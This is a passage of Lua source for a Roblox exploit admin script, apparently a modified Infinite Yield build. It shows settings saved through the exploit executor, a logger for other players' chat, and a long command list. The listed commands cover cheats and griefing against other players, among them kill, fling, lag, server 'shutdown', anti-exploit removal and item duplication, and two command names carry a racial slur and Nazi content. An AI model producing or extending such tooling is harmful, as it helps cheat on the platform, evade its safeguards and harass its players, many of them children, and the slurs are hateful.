				Exit.Image = "rbxassetid://2132544126"
				
				Exit.MouseButton1Click:Connect(function()
					FileError:Destroy()
				end)
			end
		end
	else
		prefix = ';'
		StayOpen = false
		logsEnabled = false
		aliases = {}
		binds = {}
		WayPoints = {}
		PluginsTable = {}
	end
end

saves()

function updatesaves()
	if nosaves == true and writefileExploit() then
		local update = {
		prefix = prefix;
		StayOpen = StayOpen;
		logsEnabled = logsEnabled;
		aliases = aliases;
		binds = binds;
		WayPoints = WayPoints;
		PluginsTable = PluginsTable
		}
		writefile("IY_FE.iy", game:GetService("HttpService"):JSONEncode(update))
	end
end

function Time()
	local HOUR = math.floor((tick() % 86400) / 3600)
	local MINUTE = math.floor((tick() % 3600) / 60)
	local SECOND = math.floor(tick() % 60)
	local AP = HOUR > 11 and 'PM' or 'AM'
	HOUR = (HOUR % 12 == 0 and 12 or HOUR % 12)
	HOUR = HOUR < 10 and '0' .. HOUR or HOUR
	MINUTE = MINUTE < 10 and '0' .. MINUTE or MINUTE
	SECOND = SECOND < 10 and '0' .. SECOND or SECOND
	return HOUR .. ':' .. MINUTE .. ':' .. SECOND .. ' ' .. AP
end

UserInputService = game:GetService("UserInputService")
IYMouse = Players.LocalPlayer:GetMouse()
PrefixBox.Text = prefix
SettingsOpen = false

if StayOpen == false then
	Holder.Settings.StayOpen.Button.On.BackgroundTransparency = 1
else
	Holder.Settings.StayOpen.Button.On.BackgroundTransparency = 0
end

if logsEnabled then
	Toggle.Text = 'Enabled'
else
	Toggle.Text = 'Disabled'
end

holderOffset = -250
notifyOffset = -500

function maximizeHolder()
	if StayOpen == false then
		Holder:TweenPosition(UDim2.new(1, holderOffset, 1, -220), "InOut", "Quart", 0.2, true, nil)
	end
end

function minimizeHolder()
	if StayOpen == false then
		Holder:TweenPosition(UDim2.new(1, holderOffset, 1, -20), "InOut", "Quart", 0.5, true, nil)
	end
end

function cmdbarHolder()
	if StayOpen == false then
		Holder:TweenPosition(UDim2.new(1, holderOffset, 1, -45), "InOut", "Quart", 0.5, true, nil)
	end
end

function enablebuttons()
	Settings.Aliases.Select.Visible = true
	Settings.Color.Select.Visible = true
	Settings.Keybinds.Select.Visible = true
	Settings.StayOpen.Button.On.Visible = true
	Settings.Prefix.PrefixBox.Visible = true
	Settings.Positions.Select.Visible = true
	Settings.Plugins.Select.Visible = true
end

function disablebuttons()
	Settings.Aliases.Select.Visible = false
	Settings.Color.Select.Visible = false
	Settings.Keybinds.Select.Visible = false
	Settings.StayOpen.Button.On.Visible = false
	Settings.Prefix.PrefixBox.Visible = false
	Settings.Positions.Select.Visible = false
	Settings.Plugins.Select.Visible = false
end

notifyCount = 0
function notify(text,text2)
	spawn(function()
		local LnotifyCount = notifyCount+1
		notifyCount = notifyCount+1
		Notification:TweenPosition(UDim2.new(1, notifyOffset, 1, -0), "InOut", "Quart", 0.5, true, nil)
		wait(0.6)
		local closepressed = false
		if text2 then
			Notification.Title.Text = text
			Notification.Text.Text = text2
		else
			Notification.Title.Text = 'Notification'
			Notification.Text.Text = text
		end
		Notification:TweenPosition(UDim2.new(1, notifyOffset, 1, -100), "InOut", "Quart", 0.5, true, nil)
		Notification.CloseButton.MouseButton1Click:Connect(function()
			Notification:TweenPosition(UDim2.new(1, notifyOffset, 1, -0), "InOut", "Quart", 0.5, true, nil)
			closepressed = true
		end)
		wait(10)
		if LnotifyCount == notifyCount then
			if closepressed == false then
				Notification:TweenPosition(UDim2.new(1, notifyOffset, 1, -0), "InOut", "Quart", 0.5, true, nil)
			end
			notifyCount = 0
		end
	end)
end

function CreateLabel(Name, Text)
	local sf = scroll
	if #sf:GetChildren() >= 2546 then
		sf:ClearAllChildren()
	end
	local alls = 0
	for i,v in pairs(sf:GetChildren()) do
		if v then
			alls = v.Size.Y.Offset + alls
		end
		if not v then
			alls = 0
		end
	end
	local tl = Instance.new('TextLabel', sf)
	local il = Instance.new('Frame', tl)
	tl.Name = Name
	tl.ZIndex = 6
	tl.Text = Time().." - ["..Name.."]: "..Text
	tl.Size = UDim2.new(0,322,0,84)
	tl.BackgroundTransparency = 1
	tl.BorderSizePixel = 0
	tl.Font = "SourceSansBold"
	tl.Position = UDim2.new(-1,0,0,alls)
	tl.TextTransparency = 1
	tl.TextScaled = false
	tl.TextSize = 14
	tl.TextWrapped = true
	tl.TextXAlignment = "Left"
	tl.TextYAlignment = "Top"
	il.BackgroundTransparency = 1
	il.BorderSizePixel = 0
	il.Size = UDim2.new(0,12,1,0)
	il.Position = UDim2.new(0,316,0,0)
	tl.TextColor3 = Color3.fromRGB(255,255,255)
	tl.Size = UDim2.new(0,322,0,tl.TextBounds.Y)
	sf.CanvasSize = UDim2.new(0,0,0,alls+tl.TextBounds.Y)
	sf.CanvasPosition = Vector2.new(0,sf.CanvasPosition.Y+tl.TextBounds.Y)
	local size2 = sf.CanvasSize.Y.Offset
	tl:TweenPosition(UDim2.new(0,3,0,alls), 'In', 'Quint', 0.5)
	for i = 0,50 do wait(0.05)
		tl.TextTransparency = tl.TextTransparency - 0.05
	end
	tl.TextTransparency = 0
end

IYMouse.KeyDown:connect(function(Key)
	if (Key==prefix) then
		Holder.Cmdbar:CaptureFocus()
		maximizeHolder()
		if SettingsOpen == true then
			wait(0.2)
			Holder.Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
		end
	end
end)

Holder.MouseEnter:Connect(function()
	maximizeHolder()
end)

Holder.MouseLeave:Connect(function()
	minimizeHolder()
end)

Holder.SettingsButton.MouseButton1Click:Connect(function()
	if SettingsOpen == false then SettingsOpen = true
		Holder.Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.5, true, nil)
	else SettingsOpen = false
		Holder.Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.5, true, nil)
	end
end)

Holder.Settings.StayOpen.Button.On.MouseButton1Click:Connect(function()
	if StayOpen == false then StayOpen = true
		Holder.Settings.StayOpen.Button.On.BackgroundTransparency = 0
	else StayOpen = false
		Holder.Settings.StayOpen.Button.On.BackgroundTransparency = 1
	end
	updatesaves()
end)

Clear.MouseButton1Down:connect(function()
	for _, child in pairs(scroll:GetChildren()) do
		child:Destroy()
	end
	scroll.CanvasSize = UDim2.new(0, 0, 0, 10)
end)

Toggle.MouseButton1Down:connect(function()
	if logsEnabled then
		logsEnabled = false
		Toggle.Text = 'Disabled'
		updatesaves()
	else
		logsEnabled = true
		Toggle.Text = 'Enabled'
		updatesaves()
	end
end)

if not writefileExploit() then
	notify('Saves','Your exploit does not support read/write file. Your settings will not save.')
end

ChatLog = function(plr)
	plr.Chatted:Connect(function(Message)
		if logsEnabled == true then
			CreateLabel(plr.Name,Message)
		end
	end)
end

for _, plr in pairs(Players:GetChildren()) do
	if plr.ClassName == "Player" then
		ChatLog(plr)
	end
end

Players.PlayerAdded:connect(function(player)
	ChatLog(player)
	if ESPenabled then
		ESP(player)
	end
	if CHMSenabled then
		CHMS(player)
	end
end)

Players.PlayerRemoving:connect(function(player)
	for i,v in pairs(PARENT:GetChildren()) do
		if v.Name == player.Name..'_ESP' or v.Name == player.Name..'_LC' then
			v:Destroy()
		end
	end
end)

shadow.Exit.MouseButton1Down:connect(function()
	logsDrag:TweenPosition(UDim2.new(0, 0, 1, 10), "InOut", "Quart", 0.3, true, nil)
end)

shadow.Hide.MouseButton1Down:connect(function()
	if logsDrag.Position ~= UDim2.new(0, 0, 1, -20) then
		logsDrag:TweenPosition(UDim2.new(0, 0, 1, -20), "InOut", "Quart", 0.3, true, nil)
	else
		logsDrag:TweenPosition(UDim2.new(0, 0, 1, -250), "InOut", "Quart", 0.3, true, nil)
	end
end)

Holder.Settings.Color.Select.MouseButton1Click:Connect(function()
	notify('UI Color','Not done yet :(')
end)

Holder.Settings.Keybinds.Select.MouseButton1Click:Connect(function()
	KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
	wait(0.5)
	disablebuttons()
end)

KeybindsFrame.Close.MouseButton1Click:Connect(function()
	enablebuttons()
	KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
end)

Holder.Settings.Keybinds.Select.MouseButton1Click:Connect(function()
	KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
	wait(0.5)
	disablebuttons()
end)

KeybindsFrame.Add.MouseButton1Click:Connect(function()
	KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, 270), "InOut", "Quart", 0.5, true, nil)
end)

KeybindsFrame.Delete.MouseButton1Click:Connect(function()
	binds = {}
	refreshbinds()
	updatesaves()
	notify('Keybinds Updated','Removed all keybinds')
end)

AliasesFrame.Close.MouseButton1Click:Connect(function()
	enablebuttons()
	AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
end)

Settings.Aliases.Select.MouseButton1Click:Connect(function()
	AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
	wait(0.5)
	disablebuttons()
end)

PositionsFrame.Close.MouseButton1Click:Connect(function()
	enablebuttons()
	PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
end)

Settings.Positions.Select.MouseButton1Click:Connect(function()
	PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
	wait(0.5)
	disablebuttons()
end)

local cmds={}
local customAlias = {}
AliasesFrame.Delete.MouseButton1Click:Connect(function()
	customAlias = {}
	aliases = {}
	notify('Aliases Modified','Removed all aliases')
	updatesaves()
	refreshaliases()
end)

Holder.Settings.Prefix.PrefixBox.Changed:connect(function(property)
	if property == "Text" then
		prefix = Holder.Settings.Prefix.PrefixBox.Text
		updatesaves()
	end
end)

function dragGUI(gui)
spawn(function()
local dragging
local dragInput
local dragStart
local startPos
local function update(input)
    local delta = input.Position - dragStart
	gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), "InOut", "Quart", 0.04, true, nil) 
end
gui.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = gui.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)
gui.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)
end)
end

dragGUI(logsDrag)
dragGUI(KeybindEditor)
dragGUI(PluginEditor)

local CSP = Holder
local frame = CSP:WaitForChild('CMDs')

Match = function(name,str)
	return name:lower():find(str:lower()) and true
end

canvasPos = nil
canvasTop = false
IndexContents = function(str,bool,cmdbar,anim)
	if str == '' or str == ' ' or str == prefix then
		if canvasTop == false then
			canvasPos = CMDsF.CanvasPosition.Y
		end
	else
		CMDsF.CanvasPosition = Vector2.new(0,0)
		canvasTop = true
	end
	local Index,SizeY = 0,0
	local indexnum = 0
	for i,v in next, frame:GetChildren() do
		if bool then
			if Match(v.Text,str) then
				indexnum = indexnum + 1
				Index = Index + 1
				v.Position = UDim2.new(0,10,0,Index*v.AbsoluteSize.Y-v.AbsoluteSize.Y)
				v.Visible = true
				SizeY = SizeY + v.AbsoluteSize.Y
				frame.CanvasSize = UDim2.new(0,0,0,SizeY)
			else
				v.Visible = false
			end
		else
			v.Visible = true
			SizeY = SizeY + v.AbsoluteSize.Y
			frame.CanvasSize = UDim2.new(0,0,0,SizeY)
		end
	end
	if not anim then
		if indexnum == 0 or string.find(str, " ") then
			if not cmdbar then
				minimizeHolder()
			elseif cmdbar then
				cmdbarHolder()
			end
		else
			maximizeHolder()
		end
	else
		minimizeHolder()
	end
end

PlayerGui = Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
function chatSuggestions()
	if PlayerGui:FindFirstChild("Chat") and PlayerGui.Chat:FindFirstChild("Frame") and PlayerGui.Chat.Frame:FindFirstChild("ChatBarParentFrame") and
		PlayerGui.Chat.Frame.ChatBarParentFrame:FindFirstChild("Frame") and PlayerGui.Chat.Frame.ChatBarParentFrame.Frame:FindFirstChild("BoxFrame") then
		local chatbox = PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
		
		chatbox.Changed:connect(function(property)
			if property == "Text" then
				if chatbox.Text:lower():sub(1,1) == prefix then
					if SettingsOpen == true then
						wait(0.2)
						Holder.Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
					end
					IndexContents(PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Text:lower():sub(2),true) 
				else
					minimizeHolder()
					if SettingsOpen == true then
						Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
					end
				end
			end
		end)

		chatbox.FocusLost:connect(function(enterpressed)
			if not enterpressed or chatbox.Text:lower():sub(1,1) ~= prefix then
				IndexContents('',true)
				if canvasPos ~= nil then
					CMDsF.CanvasPosition = Vector2.new(0, canvasPos)
					canvasTop = false
				end
			end
			minimizeHolder()
		end)
		
		PlayerGui.Chat.Frame.ChatBarParentFrame.ChildAdded:Connect(function(newbar)
			wait()
			if newbar:FindFirstChild('BoxFrame') then
				chatSuggestions()
			end
		end)
		
	else
		notify('Suggestions','Custom chat detected. Will not provide suggestions for commands typed in the chat.')
	end
end

chatSuggestions()

local CMDs = {}
CMDs[#CMDs + 1] = {NAME = 'flytool', DESC = 'fly objects you can sit down on'}
CMDs[#CMDs + 1] = {NAME = 'fepunch', DESC = 'makes you punch fling ppl'}
CMDs[#CMDs + 1] = {NAME = 'toolspin', DESC = 'spin your tools'}
CMDs[#CMDs + 1] = {NAME = 'blindtool', DESC = 'Makes a blind tool'}
CMDs[#CMDs + 1] = {NAME = 'twister', DESC = 'Makes a twister tool'}
CMDs[#CMDs + 1] = {NAME = 'doublefrontflip', DESC = 'Makes a doublefrontflip tool'}
CMDs[#CMDs + 1] = {NAME = 'doublebackflip', DESC = 'Makes a doublebackflip tool'}
CMDs[#CMDs + 1] = {NAME = 'lunge', DESC = 'Makes a lunge tool'}
CMDs[#CMDs + 1] = {NAME = '360', DESC = 'Makes a 360 tool'}
CMDs[#CMDs + 1] = {NAME = 'toolfling', DESC = 'flings players'}
CMDs[#CMDs + 1] = {NAME = 'fliptool / backflip', DESC = 'backflips'}
CMDs[#CMDs + 1] = {NAME = 'turnintotool / tit', DESC = 'turn into your tools'}
CMDs[#CMDs + 1] = {NAME = 'btools(CLIENT)', DESC = 'Client Btools'}
CMDs[#CMDs + 1] = {NAME = 'febtools', DESC = 'Makes fe btools replicate on unanchored parts'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'hitler', DESC = 'sings a hitler song'}
CMDs[#CMDs + 1] = {NAME = 'smurf', DESC = 'plays smurf song on some games'}
CMDs[#CMDs + 1] = {NAME = 'lookatme', DESC = 'plays xxx look at me  song on some games'}
CMDs[#CMDs + 1] = {NAME = 'nigger', DESC = 'plays nigger song on some games'}
CMDs[#CMDs + 1] = {NAME = 'exploitedserver', DESC = 'plays exploited announcement song on some games'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'rejoin / rj', DESC = 'Makes you rejoin the game'}
CMDs[#CMDs + 1] = {NAME = 'chatlogs / logs', DESC = 'Log what people say or whisper'}
CMDs[#CMDs + 1] = {NAME = 'explorer / dex', DESC = 'Opens DEX explorer'}
CMDs[#CMDs + 1] = {NAME = 'remotespy', DESC = 'Prints remotes'}
CMDs[#CMDs + 1] = {NAME = 'printuap', DESC = 'Prints unanchored parts in f9'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'lmaosign', DESC = 'Makes an FE LMAO Sign/ Needs 65 tools'}
CMDs[#CMDs + 1] = {NAME = 'bigball', DESC = 'Makes an FE big ball'}
CMDs[#CMDs + 1] = {NAME = 'littleball', DESC = 'Makes an FE little ball'}
CMDs[#CMDs + 1] = {NAME = 'tinyball', DESC = 'Makes an FE tiny ball'}
CMDs[#CMDs + 1] = {NAME = 'bigbowl', DESC = 'Makes an FE bowl'}
CMDs[#CMDs + 1] = {NAME = 'tinybowl', DESC = 'Makes an FE tiny bowl'}
CMDs[#CMDs + 1] = {NAME = 'cake', DESC = 'Makes an FE cake'}
CMDs[#CMDs + 1] = {NAME = 'onetool', DESC = 'one tool'}
CMDs[#CMDs + 1] = {NAME = 'onionring', DESC = 'Makes an FE onion ring'}
CMDs[#CMDs + 1] = {NAME = 'block', DESC = 'Makes a block'}
CMDs[#CMDs + 1] = {NAME = 'umbrella', DESC = 'makes an umbrella'}
CMDs[#CMDs + 1] = {NAME = 'window', DESC = 'makes a window kinda'}
CMDs[#CMDs + 1] = {NAME = 'shield', DESC = 'makes you have a shield'}
CMDs[#CMDs + 1] = {NAME = 'line', DESC = 'makes a line'}
CMDs[#CMDs + 1] = {NAME = 'waves', DESC = 'makes wavy line'}
CMDs[#CMDs + 1] = {NAME = 'drill', DESC = 'makes drill line'}
CMDs[#CMDs + 1] = {NAME = 'sucker', DESC = 'Makes a sucker tool'}
CMDs[#CMDs + 1] = {NAME = 'swirl', DESC = 'Makes a swirl under you'}
CMDs[#CMDs + 1] = {NAME = 'cupclub / cclub', DESC = 'Makes a club out of cups'}
CMDs[#CMDs + 1] = {NAME = 'raintools', DESC = 'rains tools'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'collideparts / cp', DESC = 'collides parts'}
CMDs[#CMDs + 1] = {NAME = 'badchat', DESC = 'makes you chat bad words doing /e (phrase)'}
CMDs[#CMDs + 1] = {NAME = 'destroyantiexploit / dae', DESC = 'Destroys anti-exploit!'}
CMDs[#CMDs + 1] = {NAME = 'dae2', DESC = 'Destroys anti-exploit!'}
CMDs[#CMDs + 1] = {NAME = 'shutdown', DESC = 'spam this'}
CMDs[#CMDs + 1] = {NAME = 'humanmine', DESC = 'makes you a human land mine'}
CMDs[#CMDs + 1] = {NAME = 'killgui', DESC = 'kill players with this'}
CMDs[#CMDs + 1] = {NAME = 'flyplayer / fp {plr}', DESC = 'fly a player'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'dupetools/ dtools', DESC = 'Duplicates your tools/R6 only!'}
CMDs[#CMDs + 1] = {NAME = '200dtools / fetools', DESC = 'Duplicates your tools/R6 only!'}
CMDs[#CMDs + 1] = {NAME = 'tpall / bringall(WIP)', DESC = 'brings all with tools'}
CMDs[#CMDs + 1] = {NAME = 'killall (WIP)', DESC = 'kills all with tools'}
CMDs[#CMDs + 1] = {NAME = 'tprandom / tpr', DESC = 'Brings Most players(NEED TOOLS)'}
CMDs[#CMDs + 1] = {NAME = 'felag / lag', DESC = 'lags players'}
CMDs[#CMDs + 1] = {NAME = 'cuffed', DESC = 'uncuffs you'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'noclip', DESC = 'Go through objects'}
CMDs[#CMDs + 1] = {NAME = 'unnoclip / clip', DESC = 'Disables noclip'}
CMDs[#CMDs + 1] = {NAME = 'fly', DESC = 'Makes you fly'}
CMDs[#CMDs + 1] = {NAME = 'unfly', DESC = 'Disables fly'}
CMDs[#CMDs + 1] = {NAME = 'flyspeed [num]', DESC = 'Set fly speed'}
CMDs[#CMDs + 1] = {NAME = 'float', DESC = 'Makes you float'}
CMDs[#CMDs + 1] = {NAME = 'unfloat', DESC = 'Disables floating'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'spos / setwaypoint [name]', DESC = 'Sets a waypoint at your position'}
CMDs[#CMDs + 1] = {NAME = 'dpos / deletewaypoint [name]', DESC = 'Deletes a waypoint'}
CMDs[#CMDs + 1] = {NAME = 'lpos / waypoint [name]', DESC = 'Teleports player to a waypoint'}
CMDs[#CMDs + 1] = {NAME = 'clearpos / cpos / clearwaypoints', DESC = 'Clears all waypoints'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'spam [text]', DESC = 'Makes you spam the chat'}
CMDs[#CMDs + 1] = {NAME = 'unspam', DESC = 'Turns off spam'}
CMDs[#CMDs + 1] = {NAME = 'pmspam [plr] [text]', DESC = 'Makes you spam a players whispers'}
CMDs[#CMDs + 1] = {NAME = 'unpmspam [plr]', DESC = 'Turns off pm spam'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'esp', DESC = 'View all players and their status'}
CMDs[#CMDs + 1] = {NAME = 'noesp / unesp', DESC = 'Removes esp'}
CMDs[#CMDs + 1] = {NAME = 'chams', DESC = 'ESP but without text in the way'}
CMDs[#CMDs + 1] = {NAME = 'nochams / unchams', DESC = 'Removes chams'}
CMDs[#CMDs + 1] = {NAME = 'locate [plr]', DESC = 'View a single player and their status'}
CMDs[#CMDs + 1] = {NAME = 'unlocate / nolocate [plr]', DESC = 'Removes locate'}
CMDs[#CMDs + 1] = {NAME = 'spectate / view [plr]', DESC = 'View a player'}
CMDs[#CMDs + 1] = {NAME = 'unspectate / unview', DESC = 'Stops viewing player'}
CMDs[#CMDs + 1] = {NAME = 'freecam / fc', DESC = 'Allows you to freely move camera around the game'}
CMDs[#CMDs + 1] = {NAME = 'unfreecam / unfc', DESC = 'Disables freecam'}
CMDs[#CMDs + 1] = {NAME = 'freecamspeed / fcspeed [num]', DESC = 'Adjusts freecam speed'}
CMDs[#CMDs + 1] = {NAME = 'firstp', DESC = 'Forces camera to go into first person'}
CMDs[#CMDs + 1] = {NAME = 'thirdp', DESC = 'Allows camera to go into third person'}
CMDs[#CMDs + 1] = {NAME = 'maxzoom [num]', DESC = 'Maximum camera zoom'}
CMDs[#CMDs + 1] = {NAME = 'fixcam', DESC = 'Fixes camera'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'lockworkspace / lockws', DESC = 'Locks the whole workspace'}
CMDs[#CMDs + 1] = {NAME = 'unlockworkspace / unlockws', DESC = 'Unlocks the whole workspace'}
CMDs[#CMDs + 1] = {NAME = 'gotopart [part name]', DESC = 'Moves your character to a part or multiple parts'}
CMDs[#CMDs + 1] = {NAME = 'bringpart [part name] (CLIENT)', DESC = 'Moves a part or multiple parts to your character'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'ambient [num] [num] [num] (CLIENT)', DESC = 'Changes ambient'}
CMDs[#CMDs + 1] = {NAME = 'nofog (CLIENT)', DESC = 'Removes fog'}
CMDs[#CMDs + 1] = {NAME = 'brightness [num] (CLIENT)', DESC = 'Changes the brightness lighting property'}
CMDs[#CMDs + 1] = {NAME = 'restorelighting / rlighting', DESC = 'Restores Lighting properties'}
CMDs[#CMDs + 1] = {NAME = 'light [radius] (CLIENT)', DESC = 'Gives your player dynamic light'}
CMDs[#CMDs + 1] = {NAME = 'nolight / unlight', DESC = 'Removes dynamic light from your player'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'age [plr]', DESC = 'Tells you the age of a player'}
CMDs[#CMDs + 1] = {NAME = 'bang [plr]', DESC = 'owo'}
CMDs[#CMDs + 1] = {NAME = 'pimp', DESC = 'pimp animation'}
CMDs[#CMDs + 1] = {NAME = 'unbang [plr]', DESC = 'uwu'}
CMDs[#CMDs + 1] = {NAME = 'headsit [plr]', DESC = 'Sit on a players head'}
CMDs[#CMDs + 1] = {NAME = 'kill [plr] (TOOL)', DESC = 'Kills a player (YOU NEED A TOOL)'}
CMDs[#CMDs + 1] = {NAME = 'bring [plr] (TOOL)', DESC = 'Brings a player (YOU NEED A TOOL)'}
CMDs[#CMDs + 1] = {NAME = 'fling', DESC = 'Flings anyone you touch'}
CMDs[#CMDs + 1] = {NAME = 'unfling', DESC = 'Disables the fling command'}
CMDs[#CMDs + 1] = {NAME = 'loopoof', DESC = 'Loops everyones character sounds (everyone can hear)'}
CMDs[#CMDs + 1] = {NAME = 'unloopoof', DESC = 'Stops the oof chaos'}
CMDs[#CMDs + 1] = {NAME = 'mario / playsong', DESC = 'mario theme song'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'respawn', DESC = 'Respawns you'}
CMDs[#CMDs + 1] = {NAME = 'refresh / re', DESC = 'Respawns and brings you back to the same position'}
CMDs[#CMDs + 1] = {NAME = 'god', DESC = 'Gives you godmode'}
CMDs[#CMDs + 1] = {NAME = 'ungod', DESC = 'Respawns/ungods you'}
CMDs[#CMDs + 1] = {NAME = 'invisible / invis', DESC = 'Makes you invisible to other players'}
CMDs[#CMDs + 1] = {NAME = 'weaken', DESC = 'Changes CustomPhysicalProperties in your player'}
CMDs[#CMDs + 1] = {NAME = 'unweaken', DESC = 'Changes CustomPhysicalProperties in your player'}
CMDs[#CMDs + 1] = {NAME = 'strengthen', DESC = 'Changes CustomPhysicalProperties in your player'}
CMDs[#CMDs + 1] = {NAME = 'unstrengthen', DESC = 'Changes CustomPhysicalProperties in your player'}
CMDs[#CMDs + 1] = {NAME = 'speed / ws [num]', DESC = 'Change your walkspeed'}
CMDs[#CMDs + 1] = {NAME = 'hipheight / hheight [num]', DESC = 'Adjusts hip height'}
CMDs[#CMDs + 1] = {NAME = 'jumppower / jpower [num]', DESC = 'Change a players jump height'}
CMDs[#CMDs + 1] = {NAME = 'gravity / grav [num]', DESC = 'Change your gravity'}
CMDs[#CMDs + 1] = {NAME = 'sit', DESC = 'Makes your character sit'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'goto [plr]', DESC = 'Go to a player'}
CMDs[#CMDs + 1] = {NAME = 'loopbring [plr] (CLIENT)', DESC = 'Loop brings a player to you (useful for killing)'}
CMDs[#CMDs + 1] = {NAME = 'unloopbring [plr]', DESC = 'Undoes loopbring'}
CMDs[#CMDs + 1] = {NAME = 'freeze / fr [plr] (CLIENT)', DESC = 'Freezes a player'}
CMDs[#CMDs + 1] = {NAME = 'thaw / unfr [plr]', DESC = 'Unfreezes a player'}
CMDs[#CMDs + 1] = {NAME = 'tpposition / tppos [coordinate]', DESC = 'Teleports you to a coordinate'}
CMDs[#CMDs + 1] = {NAME = 'CFrame / CFR', DESC = 'Makes a CFrame copier'}
CMDs[#CMDs + 1] = {NAME = 'offset [coordinate]', DESC = 'Offsets you by a coordinate'}
CMDs[#CMDs + 1] = {NAME = 'getposition / getpos', DESC = 'Notifies you the coordinates of your character'}
CMDs[#CMDs + 1] = {NAME = 'spawnpoint / spawn', DESC = 'Sets a position where you will spawn'}
CMDs[#CMDs + 1] = {NAME = 'nospawnpoint / nospawn', DESC = 'Removes your custom spawn point'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'animation / anim [ID] [speed]', DESC = 'Makes your character preform an animation (must be by roblox to replicate)'}
CMDs[#CMDs + 1] = {NAME = 'dance', DESC = 'Makes you  d a n c e'}
CMDs[#CMDs + 1] = {NAME = 'spasm', DESC = 'Makes you  c r a z y'}
CMDs[#CMDs + 1] = {NAME = 'unspasm', DESC = 'Stops spasm'}
CMDs[#CMDs + 1] = {NAME = 'headthrow', DESC = 'Simply makes you throw your head'}
CMDs[#CMDs + 1] = {NAME = 'blockhead', DESC = 'Turns your head into a block'}
CMDs[#CMDs + 1] = {NAME = 'blockhats', DESC = 'Turns your hats into blocks'}
CMDs[#CMDs + 1] = {NAME = 'blockspam', DESC = 'Spam your tools/Press backspace then reset to drop'}
CMDs[#CMDs + 1] = {NAME = 'clone', DESC = 'Creates an illusion of a clone'}
CMDs[#CMDs + 1] = {NAME = 'creeper', DESC = 'Makes you look like a creeper'}
CMDs[#CMDs + 1] = {NAME = 'drophats', DESC = 'Drops your hats'}
CMDs[#CMDs + 1] = {NAME = 'droptools', DESC = 'Drops your tools'}
CMDs[#CMDs + 1] = {NAME = 'spin [speed]', DESC = 'Spins your character'}
CMDs[#CMDs + 1] = {NAME = 'unspin', DESC = 'Disables spin'}
CMDs[#CMDs + 1] = {NAME = 'spinhats', DESC = 'Spins your characters accessorys'}
CMDs[#CMDs + 1] = {NAME = 'unspinhats', DESC = 'Undoes spinhats'}
CMDs[#CMDs + 1] = {NAME = 'hatspam', DESC = 'Drops hats'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'ooftool', DESC = 'makes your tools oof'}
CMDs[#CMDs + 1] = {NAME = 'tools', DESC = 'Copies tools from ReplicatedStorage and Lighting'}
CMDs[#CMDs + 1] = {NAME = 'keeptools / ktools', DESC = 'Saves tools to startergear'}
CMDs[#CMDs + 1] = {NAME = 'nokeeptools / noktools', DESC = 'Deletes tools in startergear'}
CMDs[#CMDs + 1] = {NAME = 'notools/removetools', DESC = 'Removes tools from character and backpack'}
CMDs[#CMDs + 1] = {NAME = 'grabtools', DESC = 'Automatically get tools that are dropped'}
CMDs[#CMDs + 1] = {NAME = 'ungrabtools', DESC = 'Disables grabtools'}
